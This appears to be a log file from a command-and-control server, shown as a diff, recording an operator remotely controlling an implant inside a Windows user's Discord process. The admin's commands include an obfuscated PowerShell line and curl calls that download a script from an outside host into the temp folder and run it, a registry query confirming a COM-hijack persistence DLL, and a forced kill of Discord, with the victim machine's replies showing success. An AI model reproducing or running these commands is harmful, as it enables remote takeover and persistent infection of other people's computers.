+[2026-01-20 19:52:29] Client disconnected: ('127.0.0.1', 41924)
+[2026-01-20 19:52:31] Connected: ('127.0.0.1', 41346)
+[2026-01-20 19:52:31] Set Client to: ('127.0.0.1', 41346)
+[2026-01-20 19:52:32] Client disconnected: ('127.0.0.1', 41926)
+[2026-01-20 20:38:49] Connected: ('127.0.0.1', 58046)
+[2026-01-20 20:38:49] ('127.0.0.1', 58046) is admin
+[2026-01-20 20:38:49] waiting for admin commands...
+[2026-01-20 20:38:52] Connected: ('127.0.0.1', 58052)
+[2026-01-20 20:38:53] Set Client to: ('127.0.0.1', 58052)
+[2026-01-20 20:38:53] Client disconnected: ('127.0.0.1', 41346)
+[2026-01-20 20:38:53] Command from Admin: __PROC__
+[2026-01-20 20:38:53] Waiting for client Reply...
+[2026-01-20 20:38:53] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 20:38:53] [WARN] Admin disconnected or error: [Errno 9] Bad file descriptor
+[2026-01-20 20:38:53] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 20:38:53] Client disconnected: ('127.0.0.1', 58046)
+[2026-01-20 20:38:54] Client disconnected: ('127.0.0.1', 58052)
+[2026-01-20 20:39:04] Connected: ('127.0.0.1', 52512)
+[2026-01-20 20:39:04] ('127.0.0.1', 52512) is admin
+[2026-01-20 20:39:06] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 20:39:06] waiting for admin commands...
+[2026-01-20 20:39:06] Connected: ('127.0.0.1', 52518)
+[2026-01-20 20:39:07] Set Client to: ('127.0.0.1', 52518)
+[2026-01-20 20:39:07] Command from Admin: __PROC__
+[2026-01-20 20:39:07] Waiting for client Reply...
+[2026-01-20 20:39:07] No Client connected.
+[2026-01-20 20:39:07] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 20:39:07] iterated admin loop
+[2026-01-20 20:39:07] waiting for admin commands...
+[2026-01-20 20:39:08] Command from Admin: __PROC__
+[2026-01-20 20:39:08] Waiting for client Reply...
+[2026-01-20 20:39:08] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 20:39:08] Reply from Client: Discord.exe, not elevated
+[2026-01-20 20:39:08] [send_ws] sending 27 bytes: 81 19 44 69 73 63 6F 72 64 2E 65 78 65 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x19Discord.exe, not elevated'
+[2026-01-20 20:39:08] iterated admin loop
+[2026-01-20 20:39:08] waiting for admin commands...
+[2026-01-20 20:39:22] Command from Admin: __EXECUTE__ ### powershell -c "$u='https://f.web'+((99,108,97,119|%{[char]$_})-join'')+'.'+((113,122,122|%{[char]$_})-join'')+'.io/i';iwr $u -o $env:temp/l.cmd;cmd /c $env:temp/l.cmd";
+[2026-01-20 20:39:22] Waiting for client Reply...
+[2026-01-20 20:39:22] [send_ws] sending 188 bytes: 81 7E 00 B8 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 70 6F 77 65 72 73 68 65 6C 6C 20 2D 63 20 22 24 75 3D 27 68 74 74 70 73 3A 2F 2F 66 2E 77 65 62 27 2B 28 28 39 39 2C 31 30 38 2C 39 ...  ascii='�~\x00�__EXECUTE__ ### powershell -c "$u=\'https://f.web\'+((99,108,97,119|%{[char]$_})-join\'\')+\'.\'+((113,122,122|%{[char]$_})-join\'\')+\'.io/i\';iwr $u -o $env:temp/l.cmd;cmd /c $env:temp/l.cmd";'
+[2026-01-20 20:39:23] Reply from Client: C:\Users\Obama\AppData\Local\Discord\app-1.0.9220
+At line:1 char:36
++ $u='https://f.web'+((99,108,97,119|{[char]$_})-join'')+'.io/i';iwr $u ...
++                                    ~~~~~~~~~~
+Expressions are only allowed as the first element of a pipeline.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpressionsMustBeFirstInPipeline
+[2026-01-20 20:39:23] [send_ws] sending 415 bytes: 81 7E 01 9B 43 3A 5C 55 73 65 72 73 5C 4F 62 61 6D 61 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 44 69 73 63 6F 72 64 5C 61 70 70 2D 31 2E 30 2E 39 32 32 30 0D 0A 41 74 20 6C 69 6E 65 3A 31 ...  ascii="�~\x01�C:\\Users\\Obama\\AppData\\Local\\Discord\\app-1.0.9220\r\nAt line:1 char:36\r\n+ $u='https://f.web'+((99,108,97,119|{[char]$_})-join'')+'.io/i';iwr $u ...\r\n+                                    ~~~~~~~~~~\r\nExpressions are only allowed as the first element of a pipeline.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + FullyQualifiedErrorId : ExpressionsMustBeFirstInPipeline"
+[2026-01-20 20:39:23] iterated admin loop
+[2026-01-20 20:39:23] waiting for admin commands...
+[2026-01-20 20:39:43] iterated admin loop
+[2026-01-20 20:39:43] waiting for admin commands...
+[2026-01-20 20:40:04] iterated admin loop
+[2026-01-20 20:40:04] waiting for admin commands...
+[2026-01-20 20:40:24] iterated admin loop
+[2026-01-20 20:40:24] waiting for admin commands...
+[2026-01-20 20:40:29] Command from Admin: __EXECUTE__ ### powershell -c "$u='https://f.web'+((99,108,97,119|%{[char]$_})-join'')+'.'+((113,122,122|%{[char]$_})-join'')+'.io/i';iwr $u -o $env:temp/l.cmd;cmd /c $env:temp/l.cmd"
+[2026-01-20 20:40:29] Waiting for client Reply...
+[2026-01-20 20:40:29] [send_ws] sending 187 bytes: 81 7E 00 B7 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 70 6F 77 65 72 73 68 65 6C 6C 20 2D 63 20 22 24 75 3D 27 68 74 74 70 73 3A 2F 2F 66 2E 77 65 62 27 2B 28 28 39 39 2C 31 30 38 2C 39 ...  ascii='�~\x00�__EXECUTE__ ### powershell -c "$u=\'https://f.web\'+((99,108,97,119|%{[char]$_})-join\'\')+\'.\'+((113,122,122|%{[char]$_})-join\'\')+\'.io/i\';iwr $u -o $env:temp/l.cmd;cmd /c $env:temp/l.cmd"'
+[2026-01-20 20:40:30] Reply from Client: C:\Users\Obama\AppData\Local\Discord\app-1.0.9220
+At line:1 char:36
++ $u='https://f.web'+((99,108,97,119|{[char]$_})-join'')+'.io/i';iwr $u ...
++                                    ~~~~~~~~~~
+Expressions are only allowed as the first element of a pipeline.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpressionsMustBeFirstInPipeline
+[2026-01-20 20:40:30] [send_ws] sending 415 bytes: 81 7E 01 9B 43 3A 5C 55 73 65 72 73 5C 4F 62 61 6D 61 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 44 69 73 63 6F 72 64 5C 61 70 70 2D 31 2E 30 2E 39 32 32 30 0D 0A 41 74 20 6C 69 6E 65 3A 31 ...  ascii="�~\x01�C:\\Users\\Obama\\AppData\\Local\\Discord\\app-1.0.9220\r\nAt line:1 char:36\r\n+ $u='https://f.web'+((99,108,97,119|{[char]$_})-join'')+'.io/i';iwr $u ...\r\n+                                    ~~~~~~~~~~\r\nExpressions are only allowed as the first element of a pipeline.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + FullyQualifiedErrorId : ExpressionsMustBeFirstInPipeline"
+[2026-01-20 20:40:30] iterated admin loop
+[2026-01-20 20:40:30] waiting for admin commands...
+[2026-01-20 20:40:50] iterated admin loop
+[2026-01-20 20:40:50] waiting for admin commands...
+[2026-01-20 20:41:05] Command from Admin: __EXECUTE__ ### curl https://f.webclaw.qzz.io/i -L -o %TMPT%/update.cmd
+[2026-01-20 20:41:05] Waiting for client Reply...
+[2026-01-20 20:41:05] [send_ws] sending 73 bytes: 81 47 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 63 75 72 6C 20 68 74 74 70 73 3A 2F 2F 66 2E 77 65 62 63 6C 61 77 2E 71 7A 7A 2E 69 6F 2F 69 20 2D 4C 20 2D 6F 20 25 54 4D 50 54 25 2F 75 ...  ascii='�G__EXECUTE__ ### curl https://f.webclaw.qzz.io/i -L -o %TMPT%/update.cmd'
+[2026-01-20 20:41:06] Reply from Client: C:\Users\Obama\AppData\Local\Discord\app-1.0.9220
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to open the file /update.cmd: Permission denied
+  0  5366    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+curl: (23) client returned ERROR on write of 5366 bytes
+[2026-01-20 20:41:06] [send_ws] sending 574 bytes: 81 7E 02 3A 43 3A 5C 55 73 65 72 73 5C 4F 62 61 6D 61 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 44 69 73 63 6F 72 64 5C 61 70 70 2D 31 2E 30 2E 39 32 32 30 0D 0A 20 20 25 20 54 6F 74 61 6C ...  ascii='�~\x02:C:\\Users\\Obama\\AppData\\Local\\Discord\\app-1.0.9220\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to open the file /update.cmd: Permission denied\r\n\r  0  5366    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r\ncurl: (23) client returned ERROR on write of 5366 bytes'
+[2026-01-20 20:41:06] iterated admin loop
+[2026-01-20 20:41:06] waiting for admin commands...
+[2026-01-20 20:41:17] Command from Admin: __EXECUTE__ ### curl https://f.webclaw.qzz.io/i -L -o %TMP%/update.cmd
+[2026-01-20 20:41:17] Waiting for client Reply...
+[2026-01-20 20:41:17] [send_ws] sending 72 bytes: 81 46 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 63 75 72 6C 20 68 74 74 70 73 3A 2F 2F 66 2E 77 65 62 63 6C 61 77 2E 71 7A 7A 2E 69 6F 2F 69 20 2D 4C 20 2D 6F 20 25 54 4D 50 25 2F 75 70 ...  ascii='�F__EXECUTE__ ### curl https://f.webclaw.qzz.io/i -L -o %TMP%/update.cmd'
+[2026-01-20 20:41:17] Reply from Client: C:\Users\Obama\AppData\Local\Discord\app-1.0.9220
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  5366  100  5366    0     0   105k      0 --:--:-- --:--:-- --:--:--  111k
+[2026-01-20 20:41:17] [send_ws] sending 373 bytes: 81 7E 01 71 43 3A 5C 55 73 65 72 73 5C 4F 62 61 6D 61 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 44 69 73 63 6F 72 64 5C 61 70 70 2D 31 2E 30 2E 39 32 32 30 0D 0A 20 20 25 20 54 6F 74 61 6C ...  ascii='�~\x01qC:\\Users\\Obama\\AppData\\Local\\Discord\\app-1.0.9220\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  5366  100  5366    0     0   105k      0 --:--:-- --:--:-- --:--:--  111k'
+[2026-01-20 20:41:17] iterated admin loop
+[2026-01-20 20:41:17] waiting for admin commands...
+[2026-01-20 20:41:24] Command from Admin: __EXECUTE__ ### %TMP%/update.cmd
+[2026-01-20 20:41:24] Waiting for client Reply...
+[2026-01-20 20:41:24] [send_ws] sending 34 bytes: 81 20 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 25 54 4D 50 25 2F 75 70 64 61 74 65 2E 63 6D 64  ascii='� __EXECUTE__ ### %TMP%/update.cmd'
+[2026-01-20 20:41:30] Reply from Client: C:\Users\Obama\AppData\Local\Discord\app-1.0.9220
+[+] Setup Successful. Please continue with the authenticaton process.
+[2026-01-20 20:41:30] [send_ws] sending 122 bytes: 81 78 43 3A 5C 55 73 65 72 73 5C 4F 62 61 6D 61 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 44 69 73 63 6F 72 64 5C 61 70 70 2D 31 2E 30 2E 39 32 32 30 0D 0A 5B 2B 5D 20 53 65 74 75 70 20 53 ...  ascii='�xC:\\Users\\Obama\\AppData\\Local\\Discord\\app-1.0.9220\r\n[+] Setup Successful. Please continue with the authenticaton process.'
+[2026-01-20 20:41:30] iterated admin loop
+[2026-01-20 20:41:30] waiting for admin commands...
+[2026-01-20 20:41:50] iterated admin loop
+[2026-01-20 20:41:50] waiting for admin commands...
+[2026-01-20 20:41:59] Command from Admin: __EXECUTE__ ### reg query "path" EXAMPLE: reg query "HKCU\Software\Classes\CLSID\{54E211B6-3650-4F75-8334-FA359598E1C5}\InprocServer32"
+[2026-01-20 20:41:59] Waiting for client Reply...
+[2026-01-20 20:41:59] [send_ws] sending 139 bytes: 81 7E 00 87 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 72 65 67 20 71 75 65 72 79 20 22 70 61 74 68 22 20 45 58 41 4D 50 4C 45 3A 20 72 65 67 20 71 75 65 72 79 20 22 48 4B 43 55 5C 53 6F ...  ascii='�~\x00�__EXECUTE__ ### reg query "path" EXAMPLE: reg query "HKCU\\Software\\Classes\\CLSID\\{54E211B6-3650-4F75-8334-FA359598E1C5}\\InprocServer32"'
+[2026-01-20 20:41:59] Reply from Client: C:\Users\Obama\AppData\Local\Discord\app-1.0.9220
+ERROR: Invalid key name.
+Type "REG QUERY /?" for usage.
+[2026-01-20 20:41:59] [send_ws] sending 109 bytes: 81 6B 43 3A 5C 55 73 65 72 73 5C 4F 62 61 6D 61 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 44 69 73 63 6F 72 64 5C 61 70 70 2D 31 2E 30 2E 39 32 32 30 0D 0A 45 52 52 4F 52 3A 20 49 6E 76 61 ...  ascii='�kC:\\Users\\Obama\\AppData\\Local\\Discord\\app-1.0.9220\r\nERROR: Invalid key name.\r\nType "REG QUERY /?" for usage.'
+[2026-01-20 20:41:59] iterated admin loop
+[2026-01-20 20:41:59] waiting for admin commands...
+[2026-01-20 20:42:07] Command from Admin: __EXECUTE__ ### reg query "HKCU\Software\Classes\CLSID\{54E211B6-3650-4F75-8334-FA359598E1C5}\InprocServer32"
+[2026-01-20 20:42:07] Waiting for client Reply...
+[2026-01-20 20:42:07] [send_ws] sending 111 bytes: 81 6D 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 72 65 67 20 71 75 65 72 79 20 22 48 4B 43 55 5C 53 6F 66 74 77 61 72 65 5C 43 6C 61 73 73 65 73 5C 43 4C 53 49 44 5C 7B 35 34 45 32 31 31 ...  ascii='�m__EXECUTE__ ### reg query "HKCU\\Software\\Classes\\CLSID\\{54E211B6-3650-4F75-8334-FA359598E1C5}\\InprocServer32"'
+[2026-01-20 20:42:08] Reply from Client: C:\Users\Obama\AppData\Local\Discord\app-1.0.9220
+
+HKEY_CURRENT_USER\Software\Classes\CLSID\{54E211B6-3650-4F75-8334-FA359598E1C5}\InprocServer32
+    (Default)    REG_SZ    C:\Users\Obama\AppData\Local\Obamaware-v3\directmanipulation.dll
+[2026-01-20 20:42:08] [send_ws] sending 244 bytes: 81 7E 00 F0 43 3A 5C 55 73 65 72 73 5C 4F 62 61 6D 61 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61 6C 5C 44 69 73 63 6F 72 64 5C 61 70 70 2D 31 2E 30 2E 39 32 32 30 0D 0A 0D 0A 48 4B 45 59 5F 43 55 ...  ascii='�~\x00�C:\\Users\\Obama\\AppData\\Local\\Discord\\app-1.0.9220\r\n\r\nHKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{54E211B6-3650-4F75-8334-FA359598E1C5}\\InprocServer32\r\n    (Default)    REG_SZ    C:\\Users\\Obama\\AppData\\Local\\Obamaware-v3\\directmanipulation.dll'
+[2026-01-20 20:42:08] iterated admin loop
+[2026-01-20 20:42:08] waiting for admin commands...
+[2026-01-20 20:42:22] Command from Admin: __EXECUTE__ ### taskkill /IM discord.exe /F
+[2026-01-20 20:42:22] Waiting for client Reply...
+[2026-01-20 20:42:22] [send_ws] sending 45 bytes: 81 2B 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 74 61 73 6B 6B 69 6C 6C 20 2F 49 4D 20 64 69 73 63 6F 72 64 2E 65 78 65 20 2F 46  ascii='�+__EXECUTE__ ### taskkill /IM discord.exe /F'
+[2026-01-20 20:42:23] No reply from Client.
+[2026-01-20 20:42:23] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 20:42:23] iterated admin loop
+[2026-01-20 20:42:23] waiting for admin commands...
+[2026-01-20 20:42:33] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 20:42:33] Waiting for client Reply...
+[2026-01-20 20:42:33] [send_ws] sending 25 bytes: 81 17 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 65 63 68 6F 20 68 69  ascii='�\x17__EXECUTE__ ### echo hi'
+[2026-01-20 20:42:33] No reply from Client.
+[2026-01-20 20:42:33] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 20:42:33] iterated admin loop
+[2026-01-20 20:42:33] waiting for admin commands...
+[2026-01-20 20:42:35] Command from Admin: __DOWNGRADE__
+[2026-01-20 20:42:35] Waiting for client Reply...
+[2026-01-20 20:42:35] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 20:42:35] [WARN] Admin disconnected or error: [Errno 32] Broken pipe
+[2026-01-20 20:42:35] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 20:42:35] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 20:42:35] Client disconnected: ('127.0.0.1', 52512)
+[2026-01-20 20:42:36] Client disconnected: ('127.0.0.1', 52518)
